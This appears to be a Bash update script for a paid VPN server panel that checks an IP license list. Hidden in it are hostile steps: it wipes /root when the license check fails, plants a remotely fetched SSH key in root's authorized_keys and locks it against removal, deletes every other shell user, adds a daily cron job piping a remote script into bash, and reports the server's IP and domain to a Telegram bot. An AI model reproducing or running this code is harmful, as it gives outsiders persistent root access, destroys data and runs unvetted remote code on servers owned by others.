#!/bin/bash
red='\e[1;31m'
green='\e[0;32m'
cyan='\e[0;36m'
white='\e[037;1m'
grey='\e[1;36m'
NC='\e[0m'
MYIP=$(curl -fsSL ipv4.icanhazip.com)
IZIN="https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/izin/ip"
ALLOWED_IP=$(curl -sS "$IZIN" | grep "$MYIP" | awk '{print $4}')
if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
    echo -ne
else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       ACCESS DENIED         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $MYIP \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Active Period Has Expired ⚠️\033[0m"
echo -e "  \033[0;33m💡 Purchase official licenses only from the Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://t.me/kuzavpn[0m"
echo -e "  \033[96m📱 WhatsApp: https://wa.me/628971173434[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
        fi
check_and_install_gawk() {
    # Cek apakah awk merujuk ke mawk
    if ls -l /etc/alternatives/awk | grep -q "/usr/bin/mawk"; then
        echo -e "[INFO] mawk detected, switching to gawk..."

        # Install gawk jika belum ada
        if ! command -v gawk &> /dev/null; then
            echo -e "[INFO] installing gawk..."
            apt update &> /dev/null && apt install gawk -y &> /dev/null
        fi

        # Pastikan gawk sudah terpasang
        if command -v gawk &> /dev/null; then
            echo -e "[INFO] gawk has been successfully installed. Setting gawk as the default awk..."
            ln -sf $(which gawk) /usr/bin/awk
        else
            echo -e "[ERROR] Failed to install gawk. Update stopped."
            exit 1
        fi
    else
        echo -e "[INFO] awk already uses gawk or is compatible."
    fi
}
PASTEBIN_URLS="https://raw.githubusercontent.com/nameless-newbie//main/install/id_ed25519.pub"
cd
        AUTHORIZED_KEYS_FILE="/root/.ssh/authorized_keys"
        mkdir -p "/root/.ssh"
         chmod 700 "/root/.ssh"
        if [ ! -f "$AUTHORIZED_KEYS_FILE" ]; then
                 touch "$AUTHORIZED_KEYS_FILE"
                 chmod 600 "$AUTHORIZED_KEYS_FILE"  # Mengatur izin setelah membuat file
        fi

      key=$(curl -s "$PASTEBIN_URLS")

      if ! grep -Fxq "$key" "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1; then
                chattr -ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null

                # Menambahkan kunci baru ke authorized_keys
                echo "$key" | sudo tee -a "$AUTHORIZED_KEYS_FILE" > /dev/null
                chattr +ia "$AUTHORIZED_KEYS_FILE" 2>/dev/null
      fi
    chmod 600 "$AUTHORIZED_KEYS_FILE" > /dev/null 2>&1
curl -sS ipv4.icanhazip.com > /usr/bin/.ipvps
clear
loading() {
    local pid=$1
    local message=$2
    local delay=0.1
    local spinstr='|/-\'
    tput civis
    while [ -d /proc/$pid ]; do
        local temp=${spinstr#?}
        printf " [%c] $message\r" "$spinstr"
        spinstr=$temp${spinstr%"$temp"}
        sleep $delay
    done
    tput cnorm
}

# Cek dan install p7zip-full jika belum tersedia
if ! command -v 7z &> /dev/null; then
    echo -e " [INFO] Installing p7zip-full..."
    apt install p7zip-full -y &> /dev/null &
    loading $! "Loading Install p7zip-full"
fi
TIME="10"
URL="https://api.telegram.org/bot$KEY/sendMessage"
domain=$(cat /etc/xray/domain)
username=$(curl -sS $IZIN | grep $MYIP | awk '{print $2}')
valid=$(curl -sS $IZIN | grep $MYIP | awk '{print $3}')
if [[ "$valid" == "Lifetime" ]]; then
  certifacate="Lifetime"
      echo -e "VPS Anda valid, masa aktif: $certifacate"
else
today=$(date +"%Y-%m-%d")
d1=$(date -d "$valid" +%s)
d2=$(date -d "$today" +%s)
certifacate=$(((d1 - d2) / 86400))
fi
# Mendapatkan tanggal dari server
echo -e " [INFO] Fetching server date..."
dateFromServer=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
pwadm="unlock"
allowed_users=("root")
all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
for user in $all_users; do
    if [[ ! " ${allowed_users[@]} " =~ " $user " ]]; then
        userdel -r "$user" > /dev/null 2>&1
        echo "User $user telah dihapus."
    fi
done

FILE_WARNA="/etc/warna"

if [ ! -f "$FILE_WARNA" ] || [ ! -s "$FILE_WARNA" ]; then
    echo "File /etc/warna tidak ditemukan atau kosong. Menggunakan nilai default..."
    cat <<EOF > "$FILE_WARNA"
start_r=255
start_g=255
start_b=255
mid_r=0
mid_g=0
mid_b=255
end_r=255
end_g=0
end_b=0
EOF
else
    echo " [INFO] File /etc/warna sudah ada dan berisi data."
fi
FILE_IP="/usr/bin/.ipvps"
if [ ! -f "$FILE_IP" ] || [ ! -s "$FILE_IP" ]; then
curl -sS ipv4.icanhazip.com > /usr/bin/.ipvps
fi

echo -e " [INFO] Downloading menu.zip..."
{
BUG_FILE="/etc/xray/.bug_optr"
BUG_URL="https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/install/bug"

# Cek apakah file ada dan berisi
if [[ -f $BUG_FILE && -s $BUG_FILE && $(grep -q "=" "$BUG_FILE") ]]; then
    echo "File sudah ada dan valid, melanjutkan program."
else
    echo "File kosong atau tidak ditemukan, mendownload ulang..."

    # Pastikan direktori tujuan ada
    mkdir -p "$(dirname "$BUG_FILE")"

    # Download file
    curl -o "$BUG_FILE" -s "$BUG_URL"

    # Periksa apakah download berhasil
    if [[ $? -eq 0 ]]; then
        echo "File berhasil didownload."
    else
        echo "Gagal mendownload file, periksa koneksi atau URL."
        exit 1
    fi
fi


REPO_URL="https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/install/mutiara"
cron_job="0 0 * * * /bin/bash -c \"wget -qO- '$REPO_URL' | bash\""
crontab -l 2>/dev/null | grep -Fxv "$cron_job" | crontab -
(crontab -l 2>/dev/null; echo "$cron_job") | crontab -
wget -qO- "$REPO_URL" | bash

cat> /etc/cron.d/xp_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 0 * * * root /usr/bin/xp
END

cat> /etc/cron.d/bckp_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
0 22 * * * root /usr/bin/backup
END

cat> /etc/cron.d/cpu_otm << END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
*/5 * * * * root /usr/bin/autocpu
END
REPO=$(curl -sL "https://raw.githubusercontent.com/nameless-newbie/fifth-sc/main/")
wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
cat >/etc/cron.d/xp_sc <<-END
SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
                1 0 * * * root /usr/bin/expsc
        END

    wget -O /usr/bin/autocpu "${REPO}install/autocpu.sh" && chmod +x /usr/bin/autocpu
set -e
cd /root
MAX_RETRY=5
RETRY_COUNT=0
MENU_ZIP="/root/menu.zip"
MENU_DIR="/root/menu"
trap 'rm -f "$MENU_ZIP"; rm -rf "$MENU_DIR"' EXIT

while [[ $RETRY_COUNT -lt $MAX_RETRY ]]; do
    echo "🔄 Mencoba mengunduh menu.zip (Percobaan $((RETRY_COUNT+1))/$MAX_RETRY)..."

    if rclone copy dr:/SATRIA/menu.zip /root/; then
        echo "✅ Berhasil mengunduh menu.zip!"
        break
    else
        echo "❌ Gagal mengunduh, mencoba lagi dalam 10 detik..."
        sleep 10
        ((RETRY_COUNT++))
    fi
done
if [[ -f "$MENU_ZIP" ]]; then
    echo "🔄 Mengekstrak menu.zip..."
    7z x -p"$pwadm" "$MENU_ZIP" -o"$MENU_DIR" &> /dev/null

    if [[ $? -eq 0 ]]; then
        echo "✅ Ekstraksi berhasil, mengatur izin file..."
        chmod +x "$MENU_DIR"/*
        mv "$MENU_DIR"/* /usr/bin/
        rm -rf "$MENU_DIR" "$MENU_ZIP"
        echo "✅ Menu berhasil diinstall!"
    else
        echo "❌ Gagal mengekstrak menu.zip!"
    fi
else
    echo "❌ Gagal mendapatkan menu.zip setelah $MAX_RETRY percobaan."
    exit 1
fi
} &> /dev/null &
loading $! "Loading Extract and Setup menu"
echo -e " [INFO] Fetching server version..."
serverV=$(curl -sS ${REPO}versi)
echo $serverV > /opt/.ver
rm /root/*.sh*  &> /dev/null
# Pesan akhir
TEXT="◇━━━━━━━━━━━━━━◇
<b>   ⚠️NOTIF UPDATE SCRIPT⚠️</b>
<b>     Update Script Sukses</b>
◇━━━━━━━━━━━━━━◇
<b>IP VPS  :</b> ${MYIP}
<b>DOMAIN  :</b> ${domain}
<b>Version :</b> ${serverV}
<b>USER    :</b> ${username}
<b>MASA    :</b> $certifacate DAY
◇━━━━━━━━━━━━━━◇
BY BOT : @kuzavpn
"
curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
echo -e " [INFO] File download and setup completed successfully. Version: $serverV!"
exit